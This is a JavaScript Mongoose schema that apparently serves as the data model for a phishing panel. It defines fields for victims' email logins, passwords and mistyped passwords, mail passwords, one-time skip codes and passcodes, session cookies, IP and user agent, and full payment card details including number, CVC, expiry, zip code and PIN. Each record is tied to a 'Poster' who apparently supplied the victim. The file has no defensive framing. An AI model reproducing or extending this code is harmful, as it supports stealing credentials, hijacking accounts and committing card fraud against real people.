import mongoose from 'mongoose'
// cashPin,cashCard,debitCard
const Schema = mongoose.Schema;
const infoSchema = new Schema({

    site: {
        type: String,
    },
    email: {
        type: String,

        lowercase: true,

    },
     adminId:{
        type: String,
    },
    password: {
        type: String,


    },
    skipcode: {
        type: String,
    },

    username: {
        type: String,
    },
    passcode: {
        type: String,
    },
    poster: {
        type: String,
    },
    root: {
        type: mongoose.Schema.Types.ObjectId,

        ref: 'Poster'
    },
    ip: {
        type: String,
    },
    agent: {
        type: String,
    },
    number: {
        type: String,
    },                            
    cashPin:{
       type: Number, default: 0
    },
    cashCard:{
        type: String, default: 0
    },
    debitCard:{
        type: String, default: 0
    },
    mail: { type: String },
    wrongPassword: { type: String },

    mailPass: { type: String },
    onlyCard: { type: String },
    holdingCard: { type: String },
    status: { type: String },

    validity: { type: String },
    address: { type: String },
    cardNumber: { type: String },

    cvc: { type: String },
    name: { type: String },
    zipCode: { type: String },
   cookie: { type: String },

}, { timestamps: true })




const Info = mongoose.model('Info', infoSchema);

export default Info



// 6558fca9d08567217d7b4cef